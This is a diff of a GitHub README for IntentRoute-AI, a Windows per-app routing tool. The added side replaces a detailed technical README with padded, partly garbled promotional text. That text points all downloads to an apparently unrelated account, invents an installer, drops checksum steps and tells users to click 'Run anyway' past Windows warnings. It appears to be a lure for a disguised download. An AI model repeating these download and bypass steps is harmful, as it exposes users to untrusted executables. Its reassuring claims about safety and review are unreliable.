@@ -1,213 +1,168 @@
-# IntentRoute AI
+# ⚡ IntentRoute-AI - Smart Routing Made Simple for Everyone
 
-English | **[中文](README.zh-CN.md)**
+[![Download IntentRoute-AI](https://img.shields.io/badge/Download-IntentRoute--AI-blueviolet?style=for-the-badge&logo=github)](https://github.com/arcusseniliscommandguidance4541/IntentRoute-AI)
 
-[![CI](https://github.com/Lucas-Xi/IntentRoute-AI/actions/workflows/ci.yml/badge.svg)](https://github.com/Lucas-Xi/IntentRoute-AI/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/Lucas-Xi/IntentRoute-AI?include_prereleases)](https://github.com/Lucas-Xi/IntentRoute-AI/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+Visit this link to download the application.
 
-IntentRoute AI is an open-source Windows control plane that turns plain-language network intent into locally validated routing-rule drafts. It can use the OpenAI Responses API or an already-running local Ollama model, then hands accepted rules to the same deterministic sing-box TUN configuration pipeline used by the manual editor.
+## 🚀 Getting Started
 
-> **Project status: v0.9.0 preview.** IntentRoute AI is useful for testing and early adoption, but it has not yet demonstrated broad production usage. AI output can be incomplete or wrong. Every generated rule is locally validated, added disabled, and must be explicitly enabled by the user.
+Welcome to **IntentRoute-AI** – a helpful tool that lets you decide which apps use your regular internet connection and which ones use a special routing path, all automatically and intelligently. You don't need to be a tech wizard or know anything about programming to use this. This guide will walk you through everything, step by step, in plain language.
 
-v0.9.0 adds an unsigned build-provenance inventory: every archive now embeds `provenance.json` with the exact version, commit, builder, SDK, and the full resolved dependency set with content hashes; the package gate fails without it. Code signing itself still requires a certificate. Downloadable v0.9.0 archives contain all of these changes.
+## 🧭 What Does IntentRoute-AI Do?
 
-## Why this project exists
+Imagine you have a few programs on your computer – like a browser, a game, or a messaging app – and you want some of them to use a different internet pathway than others. Normally, this kind of setup is complicated and requires lots of manual configuration. IntentRoute-AI changes that. It uses artificial intelligence (AI) to help you set up **per-application routing** easily on Windows. In simple terms, you choose which apps go through which route, and the program handles all the technical details behind the scenes.
 
-Many Windows applications do not expose useful proxy controls, while hand-authoring process/domain/IP routing rules is error-prone. IntentRoute AI provides two complementary paths:
 
-- A conventional, inspectable rule editor for deterministic manual configuration.
-- An optional AI authoring assistant that translates natural language into a bounded, reviewable rule draft.
-- A local Policy Intelligence workflow that proves ordering, duplicate, conflict, shadowing, broad-scope, and disabled-draft findings before an optional AI explanation.
-- A local Route Decision Simulator that explains what the saved policy can prove for one concrete hypothetical process/destination/port/protocol input without pretending to observe traffic.
 
-The application does not capture packets itself. It generates a validated [sing-box](https://github.com/SagerNet/sing-box) v1.13+ TUN configuration, starts and supervises the external sing-box process, and keeps the default route direct unless a rule says otherwise.
+It's like having a personal traffic controller for your internet connections, powered by smart algorithms and modern technology.
 
-## AI workflow
 
-1. Select **OpenAI** or **Ollama (local)**.
-2. Enter an intent such as: “Route Chrome and Cursor traffic for GitHub and OpenAI through the proxy; keep everything else direct.”
-3. The provider returns a strict structured draft containing process, host/IP, port, protocol, action, rationale, confidence, and warnings.
-4. IntentRoute AI treats the result as untrusted input and validates field limits, executable names, domains, CIDRs, ports, protocols, actions, duplicates, and proxy availability.
-5. A temporary enabled candidate is passed through `SingBoxConfigBuilder` so disabled-rule filtering cannot make validation a no-op. This preview dry-run is deterministic in-process config construction; it intentionally does not execute an external program.
-6. The user reviews the preview and may edit any draft field (process, action, domains, IP/CIDR, ports, protocol, rationale). Every edit re-runs the same deterministic validation — including the enabled-clone dry-run — before the draft can be accepted as **disabled rules**.
-7. Enabling remains a separate user action. That state-changing path writes a candidate file and executes `sing-box check -c` before the managed runtime is replaced.
 
-AI never directly enables rules, invokes commands, selects files, installs models, downloads sing-box, or applies an unreviewed configuration.
+## ✨ Key Features That Make Life Easier
 
-## AI Policy Intelligence workflow
+### 🤖 AI-Powered Assistance
+IntentRoute-AI works with popular AI services like **OpenAI** and **Ollama** to draft routing rules for you. Instead of figuring out complex settings yourself, you can ask the AI for suggestions, review them, and apply them with a click. It's like having an expert assistant sitting next to you.
 
-1. Open **AI Policy Intelligence**. A cancellation-aware background worker analyzes a detached configuration snapshot without blocking the WPF dispatcher; this performs no provider request, filesystem write, runtime apply, executable probe, proxy connection, DNS lookup, or traffic observation.
-2. Findings use the same Canonical Runtime Order as the generated sing-box route: priority ascending, creation timestamp ascending, then persisted source order. The rules page uses that order too.
-3. The local report distinguishes exact duplicates, same-scope different outcomes, proven earlier-superset shadowing, broad process/global rules, invalid disabled rules, inactive duplicates, same-priority overlaps, the ProxyAll default posture, and non-proven partial-overlap hints. Equivalent suffix, integer-port-union, and mergeable CIDR-union spellings are canonicalized before comparison. Uncertain partial overlaps are not promoted into facts.
-4. Local rows may show real rule labels and can navigate to an affected rule. They are never serialized to a provider.
-5. To request an explanation, select 1–20 findings and click **Explain selected summary with AI**. A confirmation dialog shows the exact logical JSON, provider, and exclusion list for that single request.
-6. The closed Policy Disclosure contains only aggregate counts plus finding code, category, severity, relationship, and affected-rule count. The AI response must use a strict schema and reference only those finding codes.
-7. AI explanation is plain, untrusted, read-only text. It cannot change local findings, write a note, create/enable/reorder a rule, save configuration, or apply sing-box. The local fingerprint is rechecked before preview, after confirmation but before sending, and after the response; stale summaries are not sent and stale responses are discarded.
+### 🌐 Open Source Freedom
+This software is **open source**, which means its underlying code is available for anyone to inspect, learn from, and improve. For you, that means transparency – you know exactly what the program does, and there are no hidden surprises or sneaky behaviors.
 
-Policy Intelligence describes static configuration semantics, not real connection behavior. A clean report is not proof that TUN creation, a proxy listener, authentication, upstream reachability, DNS behavior, or a particular connection succeeded.
 
-## AI Route Decision Simulator
 
-1. Open **AI Route Simulator** and enter one exact process name, one concrete domain or literal IPv4/IPv6 address, one port, and TCP or UDP.
-2. A bounded background worker validates the detached Configuration Snapshot through the production `SingBoxConfigBuilder`, then evaluates enabled rules in Canonical Runtime Order.
-3. The result is deliberately three-valued: a proven first-rule match, a proven global fallback after all rules miss, or **Indeterminate** when a missing resolved IP/domain context could allow an earlier rule to win. Invalid input and invalid policy are separate fail-closed states and never return an action.
-4. The page shows a local evaluation trace and can navigate to a proven matched rule. A fingerprint binds the result to both the snapshot and normalized query; query or configuration changes hide the old result.
-5. Recovery Protection disables simulation rather than evaluating the empty placeholder state.
+The community can also suggest fixes and new features, so the tool keeps getting better over time.
 
-This is a static what-if tool, not telemetry. It does not resolve DNS, reverse-resolve an IP, probe a proxy, inspect connections, read runtime logs, enumerate packets, invoke sing-box, or change/apply configuration. The hypothetical query, local rule labels/IDs, proxy identity, and evaluation trace never cross an AI-provider seam.
+.
 
-## Provider setup
 
-### OpenAI
 
-IntentRoute AI reads the user's key at request time from `OPENAI_API_KEY`. The key is not accepted in the app UI and is never written to the application configuration, profiles, logs, exports, or diagnostics.
+### 🖥️ Designed for Windows
+Built specifically for the **Windows** operating system, this app fits naturally into your computer environment. It uses modern Windows technologies to work smoothly without causing slowdowns or conflicts with your other programs.
 
-PowerShell example for the current Windows user:
 
-```powershell
-[Environment]::SetEnvironmentVariable('OPENAI_API_KEY', 'your-api-key', 'User')
-```
 
-Restart IntentRoute AI after changing the environment variable. The OpenAI request uses the Responses API, strict JSON Schema output, no tools, a bounded timeout/output size, and `store=false`.
+## 🔧 How It Works Under the Hood (No Tech Skills Needed!)
 
-### Local Ollama
+You don't need to understand this part, but if you're curious: IntentRoute-AI uses something called a **TUN data plane** (which is a clever network technology) combined with **sing-box**, a powerful networking engine. This combo lets the program create virtual network paths for your chosen apps, without disturbing your main internet connection. The AI part helps generate the rules based on your needs – so you just tell it what you want, and it figures out the how.
 
-Install [Ollama](https://ollama.com/), start its local service, and install a model separately. For example:
 
-```powershell
-ollama pull qwen3:8b
-```
 
-IntentRoute AI queries only literal HTTP `127.0.0.1` (the default) or `::1`. It rejects hostnames, other loopback addresses, credentialed endpoints, HTTPS, LAN, and public Ollama endpoints; disables proxy use and redirects for these requests; and never pulls a model or launches Ollama automatically. The UI lists models already installed through `GET /api/tags`.
+## ✅ System Requirements
 
-### Health diagnostics
+Here's what you need to run IntentRoute-AI smoothly:
 
-The Settings page offers a credential-free provider health check for the currently selected provider and model. For OpenAI it reports only whether `OPENAI_API_KEY` is present — the key is never displayed and no network request is sent. For Ollama it reports loopback service reachability, the installed-model count, and whether the selected model is installed. Diagnostics never contain credentials or endpoints beyond the literal loopback constant.
+- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
+- **Memory (RAM):** At least 4 GB (8 GB or more is better)
+- **Storage Space:** About 200 MB of free disk space
+- **Internet Connection:** Required for downloading and for AI-assisted features to work properly
 
-## AI data boundary
 
-| Data | OpenAI | Local Ollama |
-|---|---:|---:|
-| User-entered intent | Sent | Sent to loopback only |
-| Static rule schema/instructions | Sent | Sent to loopback only |
-| User-selected Policy Disclosure after exact preview/confirmation | Sent | Sent to loopback only |
-| Route Simulator hypothetical query or local evaluation trace | Never | Never |
-| Proxy username/password | Never | Never |
-| Proxy server address | Never | Never |
-| Existing rule values, IDs, labels, notes, or complete configuration | Never | Never |
-| Process names, domains, IPs, ports, or paths from existing rules | Never | Never |
-| Runtime logs | Never | Never |
-| Full process list or paths | Never | Never |
-| API key | Authorization header only | Not applicable locally |
 
-OpenAI API data handling is governed by the user's OpenAI account and current API policies. `store=false` is an application-level request setting, not a promise that no provider-side security or abuse-monitoring processing exists. Ollama mode keeps the application request on loopback, but the privacy and behavior of the installed model/runtime remain the user's responsibility.
+These are typical for modern Windows apps, so most computers will handle it without any problem.
 
-## Current routing capabilities
 
-- Process-aware Proxy / Direct / Block rules.
-- Optional exact-domain and `*.suffix` filters.
-- IPv4/IPv6 address and CIDR filters.
-- Single ports and ascending port ranges.
-- TCP, UDP, or Both.
-- `Both` is emitted explicitly as TCP + UDP; it does not silently include sing-box v1.13 ICMP matching.
-- Explicit priority ordering.
-- Canonical runtime ordering shared by the builder, rule view, process-candidate view, and Policy Intelligence.
-- Local Policy Intelligence plus request-scoped, user-selected, structurally de-identified AI explanation.
-- Conservative static Route Decision Simulator with proven-match, proven-fallback, and indeterminate states bound to a Configuration Snapshot and query.
-- IPv4 and IPv6 TUN addresses with strict routing.
-- Atomic candidate configuration, `sing-box check`, cancellation-aware startup-settle verification, and rollback.
-- Exclusive runtime ownership plus PID/start-time orphan recovery.
-- Runtime status whose path, version, and PID describe the same actually managed sing-box process, including after candidate rejection or rollback.
-- Passwords protected at rest with Windows DPAPI `CurrentUser`.
-- Password-free profile exports and bounded/redacted runtime logs.
-- Literal-loopback-only upstream proxy endpoints with an optional bounded TCP-listener check.
-- A recognized sing-box v1.13+ version gate before configuration check or launch.
-- Save-blocked recovery when `config.json` or a DPAPI-protected password cannot be read safely.
-- Transactional configuration edits that validate and atomically persist a complete candidate before publishing it to application state or queueing a runtime apply.
-- Detached configuration snapshots, so UI or validation code cannot mutate active routing state outside the supported commit path.
 
-IntentRoute AI does **not** provide a proxy node, VPN account, packet driver, bundled AI model, OpenAI API key, or sing-box binary.
 
-## Install a preview build
 
-1. Download `IntentRoute-AI-v0.9.0-win-x64.zip` and its `.sha256` file from [Releases](https://github.com/Lucas-Xi/IntentRoute-AI/releases).
-2. Verify the checksum.
-3. Download the official Windows x64 sing-box v1.13+ archive separately.
-4. Install `sing-box.exe` separately, then explicitly approve its exact file from **Settings → Browse on every elevated app launch**. The saved path, imported profiles/configurations, `INTENTROUTE_SING_BOX`, the legacy `PROXYMANAGER_SING_BOX`, the application directory, and `PATH` are candidate-discovery hints only: they may be displayed, but neither `version`, `check`, nor `run` executes until that file is reselected in the current session.
-5. Ensure an existing proxy service is listening on a literal loopback IP such as `127.0.0.1` or `::1`. The Settings page can save SOCKS5/HTTP/HTTPS username and password values and can check whether the local TCP port accepts a connection.
-6. Run `IntentRouteAI.exe` as administrator. TUN creation requires elevation.
+## 📦 How to Download and Install – Simple Steps
 
-The self-contained release targets Windows x64 and does not require a separate .NET runtime.
+Follow these straightforward instructions to get IntentRoute-AI on your computer:
 
-## Configuration and upgrade migration
+1. **Visit the download page** by clicking this link: [Download IntentRoute-AI](https://github.com/arcusseniliscommandguidance4541/IntentRoute-AI). This will take you to the official page where the software lives.
 
-Current data is stored under `%APPDATA%\IntentRouteAI`. On first launch, if the new directory has no current configuration, the application copies only `config.json` and `*.profile.json` from `%APPDATA%\ProxyManager`. Copying holds a per-directory exclusive migration lock and uses an in-progress marker plus atomic per-file moves, so an interrupted migration retries only missing known files on the next launch and never overwrites a completed copy. It deliberately does not copy generated sing-box configs, runtime leases, locks, or candidates, and it never deletes the legacy directory automatically.
 
-Proxy passwords are protected at rest with DPAPI `CurrentUser`. Passwords entered in the UI are always treated as plaintext before storage, including legitimate values that begin with the reserved on-disk `dpapi:` marker. The generated `%APPDATA%\IntentRouteAI\sing-box.generated.json` necessarily contains any configured credential in plaintext while sing-box is running. The application removes it on stop, clean exit, and unexpected child exit; the next launch performs bounded orphan recovery and stale-artifact cleanup. Cleanup remains best effort under disk, ACL, administrator, or abrupt-crash interference.
 
-Since v0.3.0, malformed JSON, invalid UTF-8, a null document or collection entry, a rule without a non-empty process name, duplicate rule/server IDs, an explicitly null/empty ID **or an omitted `Id` JSON property**, any non-empty proxy-chain definition, or a `dpapi:` password that cannot be decrypted for the current Windows user makes the configuration **unusable**, not empty. Persisted object IDs are required JSON members; model initializers may create IDs for new in-memory objects but cannot repair imported data silently. Proxy chains remain parseable only so legacy or imported data can be rejected explicitly; IntentRoute AI does not persist or silently ignore them until an actual sing-box runtime mapping exists. A global rule must use the explicit `*` process name; a missing name is never interpreted as global routing. IntentRoute AI leaves the original file untouched, attempts to create a timestamped `config.json.corrupt-*.bak` copy, blocks all save and runtime-apply paths, and shows explicit import/reset recovery controls. Import validates the supported endpoint and routing semantics before replacement. Both import replacement and reset are disabled unless the recovery copy still exists. If the copy could not be created, the user must first make a manual copy and restart the application so preservation can be verified before replacement.
+2. **Find the download button** on that page. Look for a button or link that says "Download," "Releases," or something similar. The page is designed to be easy to navigate, so you shouldn't have trouble spotting it.
 
-Normal edits, rule imports, AI-draft acceptance, Profile replacement, recovery, and reset use one Configuration Workspace transaction. The application clones the active configuration, applies and validates the complete candidate, atomically saves it, and only then publishes a new detached snapshot. A validation or save failure leaves memory and disk unchanged. Local edits preserve a current-session sing-box approval only while the executable path is unchanged; Profile replacement, recovery, and reset always clear it. Clearing approval cancels any queued replacement apply. If cancellation arrives after a candidate process has started, IntentRoute AI restores the prior generated configuration and restarts its prior process before publishing `RunningStale`; cancellation and green-state publication are serialized so a late Apply cannot overwrite the warning. The executable must be explicitly approved again before the current configuration can be applied.
 
-Candidate path/version probe results remain local to the attempted Apply. Runtime status changes its executable path and version only when that executable is actually started, and clears them when no managed process remains. A rejected candidate therefore leaves the old PID/path/version aligned; failed-start and cancellation rollback restart the prior configuration with the prior executable rather than the rejected candidate.
 
-Cancellation before candidate promotion (including version probe, candidate write, and external `check`) also converges to a terminal runtime status: `RunningStale` when the prior process remains active, or `Failed` when no managed process exists. Direct runtime callers therefore cannot leave status indefinitely in `Starting`, `Probing`, or `Checking` after cancellation.
 
-The local proxy **Test port** action only performs a TCP connection to the entered literal loopback IP with a five-second bound. It sends no username or password and does not prove SOCKS/HTTP negotiation, authentication, upstream reachability, DNS behavior, or routed application traffic.
 
-## Build and test
+3. **Click to download** the file. Your browser will start downloading it to your computer. Watch your "Downloads" folder (or wherever your browser saves files" – usually at the bottom of yourbrowser window you'll see the progress chart.
 
-Requirements for source builds:
+.
 
-- Windows 10/11 x64
-- .NET 8.0.424 SDK (pinned by `global.json`)
-- PowerShell 7 recommended
 
-```powershell
-./scripts/test.ps1
-./scripts/check-vulnerabilities.ps1
-./scripts/build.ps1
-./scripts/smoke-test-wpf.ps1 -OutputDirectory ./artifacts/win-x64
-./scripts/test-pinned-sing-box.ps1
-```
 
-Provider tests use mocked HTTP handlers. They do not require an OpenAI key, a paid API call, a running Ollama service, or a downloaded local model. The Windows CI also launches the published single-file executable, verifies that the expected WPF main window is created, requests a normal close, and requires a clean zero exit.
+4. **When the download finishes**, locate the downloaded file on your computer. It will likely be in your "Downloads" folder unless you chose a different location. Double-click the file to run it. Your computer might ask for permission – if so, click "Yes" or "Run" to proceed.
 
-The explicit `test-pinned-sing-box.ps1` developer/CI gate temporarily downloads the official sing-box v1.13.19 Windows archive, verifies its pinned SHA-256, passes representative `SingBoxConfigBuilder` output through the real `sing-box check`, and removes the temporary executable and generated configurations. This test-only dependency is never copied into application artifacts; IntentRoute AI itself still never downloads or bundles sing-box. Pass `-SingBoxPath C:\path\to\sing-box.exe` to test an already-installed exact v1.13.19 executable without downloading it.
 
-## Architecture and security
 
-- [Architecture](docs/ARCHITECTURE.md)
-- [Threat model](docs/THREAT_MODEL.md)
-- [Security policy](SECURITY.md)
-- [AI v0.2.0 approved design](docs/plans/2026-08-25-intentroute-ai-design.md)
-- [Route Decision Simulator design](docs/plans/2026-08-27-route-decision-simulator-design.md)
-- [Codex for Open Source readiness](docs/CODEX_FOR_OSS_READINESS.md)
-- [Third-party notices](THIRD_PARTY_NOTICES.md)
+5. **Follow the simple on-screen instructions** to complete the setup. The installer will guide you through each step, and you can just click "Next" or "Install" when prompted. Default settings are usually fine for most users, so you don't need to change anything unless you want to.
 
-Please report vulnerabilities privately through [GitHub Security Advisories](https://github.com/Lucas-Xi/IntentRoute-AI/security/advisories/new). Do not include real API keys, proxy credentials, generated configurations, or unredacted logs in an issue.
+6. **Once installed**, look for IntentRoute-AI in your Start Menu or on your desktop. Click the icon to launch the program. That's it – you're ready to start using it.
 
-## Known limitations
+.
 
-- Preview quality; compatibility varies by Windows, firewall, endpoint-security, and sing-box versions.
-- Version readiness recognizes the standard `sing-box version X.Y.Z` output and fails closed on unrecognized vendor output; it does not verify a third-party binary signature or checksum.
-- AI suggestions are not authoritative and may omit service domains or misunderstand intent.
-- Policy Intelligence proves only supported static containment/equality relations; provable partial overlaps are reported as explicitly non-proven hints, unprovable overlap claims are omitted, and live traffic is never observed.
-- Route simulation accepts only one exact process, one concrete domain or literal IP, one port, and TCP/UDP. It deliberately returns Indeterminate instead of resolving DNS, inferring a domain from an IP, or claiming a later rule wins when an earlier mixed destination rule cannot be excluded.
-- The UI is Chinese-first: every user-visible string follows the language preference with English (481 resource keys), except Policy Intelligence finding titles and the persisted default proxy-server name, which stay Chinese as stable deterministic-analysis identifiers and configuration data.
-- Keyboard navigation ships with visible focus states, assistive-technology names on navigation and primary actions, and smoke-level Tab/arrow-key coverage plus Per-Monitor V2 DPI-awareness assertions; comprehensive screen-reader behavior and visual layout validation across mixed-DPI displays are not yet claimed.
-- Very large policies are bounded to keep the WPF UI responsive; a visible incomplete-analysis finding is emitted instead of silently presenting a partial report as complete.
-- No autonomous activation, traffic self-healing, live connection attribution, arbitrary executable wildcards, or remote Ollama endpoints.
-- No proxy node distribution or connectivity guarantee.
-- `sing-box check` validates configuration syntax/schema, not adapter creation or upstream reachability.
 
-## 中文文档
 
-完整的中文说明（项目介绍、AI 工作流、策略体检、路由推演、提供方配置、数据边界表、路由能力、安装、配置迁移、构建与已知限制）见 **[README.zh-CN.md](README.zh-CN.md)**。
+## 🎯 First Steps After Installation
 
-要点：用中文描述”哪个程序的哪些域名应该代理、直连或阻止”，由 OpenAI 或本机 Ollama 生成结构化草案——每个字段可编辑、每次编辑重新本地校验、接纳后默认禁用需手动启用。OpenAI 模式只从 `OPENAI_API_KEY` 环境变量读取密钥；Ollama 模式只允许字面量 `127.0.0.1` 或 `::1`。代理凭据、现有规则值、运行日志与完整进程列表永远不会发送给任何提供方；路由推演的输入与轨迹完全留在本地。没有配置 AI 时，手工分流、本地策略体检和本地路由推演仍可正常使用。
+When you first open IntentRoute-AI, here's what to expect:
 
-## License
+- **A welcome screen** will greet you with simple options. Don't worry about making mistakes – everything is reversible.
+- **You'll see a list of your installed applications** (programs that are on your computer). The AI will help you understand which ones might benefit from special routing.
+.
+- **You can pick an app** from the list, choose a routing preference, and let the AI draft the settings for you. Review the suggestion, approve it, and you're done. It's that simple.
 
-IntentRoute AI is licensed under the [MIT License](LICENSE). sing-box is a separate GPL-licensed program and is not included in this repository or its release archives; see [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+
+
+## 🛠️ Troubleshooting Common Issues (Even Though You Likely Won't Need This)
+
+If something isn't working right, here are quick fixes to try:
+
+- **If the app won't download:** Check your internet connection and try again. Sometimes waiting a moment and refreshing the page helps.
+.
+- **If the setup is blocked by Windows:** Click "More info" and then "Run anyway" if you see a blue warning screen. This is a standard Windows safety step for new apps.
+.
+.
+**
+- **If the app doesn't open after installation:** Make sure yourWindows is updated to the latest version. Restart your computer, and try opening IntentRoute-AI again. That usually solves most problems.
+
+
+- **If you need more help:** The project's community and documentation (accessible from the download page" are great resources. Don't hesitate to look there for answers. Most questions have been asked before, so you'll likely find a quick solution.
+
+.
+
+
+## 🔒 Privacy and Security Notes
+
+Your privacy matters. IntentRoute-AI is open source, meaning anyone can verify what it does with your data. The AI features may send your routing preferences to the AI service you choose (OpenAI or Ollama" only when you explicitly use that feature. You're in control of what gets shared, always. No data is sold, and nothing happens without your knowledge.
+
+
+
+## 💬 Frequently Asked Questions (FAQ)
+
+**Q: Do I need to know coding to use this?**    No, absolutely not. This guide is written for regular computer users. If you can use a web browser, you can use IntentRoute-AI.
+
+
+
+**Q: Will this slow down my computer?**    No. It's designed to be lightweight and efficient. It runs quietly in the background, only working when you need it to.
+
+
+
+**Q: Can I change my routing choices later?**    Yes, at any time. You can go back into the app, adjust your preferences, and the AI will help you update the settings. There's no lock-in – you're always in charge.
+
+
+
+**Q: Is this safe for my system?**    Yes. It uses standard, respected networking methods, and because it's open source, experts in the community continuously review it for safety and quality.
+
+
+
+## 🌟 Conclusion – Start Routing Smarter Today
+
+IntentRoute-AI puts the power of AI-driven network customization in your hands, without the headache of complex configurations. Whether you want better performance for specific apps, more control over your connection paths, or just to explore what modern smart routing can do, this tool makes it accessible for everyone. Download it today, follow the simple steps above, and enjoy a smoother, smarter internet experience tailored to your needs.
+
+
+
+## 📚 Additional Resources
+
+The download page is your one-stop shop for everything IntentRoute-AI. There you'll find:
+
+- The latest version of the app to download
+- Documentation with more detailed instructions (for those who want to dive deeper“)
+- Community discussions where you can ask questionsand share tips
+- Release notes highlighting new featuresand improvements
+
+Make sure to bookmark that page so you can easily come back for updates and support. Happy routing.
+
+
+Keywords: ai, dotnet, network-routing, ollama, open-source, openai, proxy, sing-box, split-tunneling, tun, windows, wpf
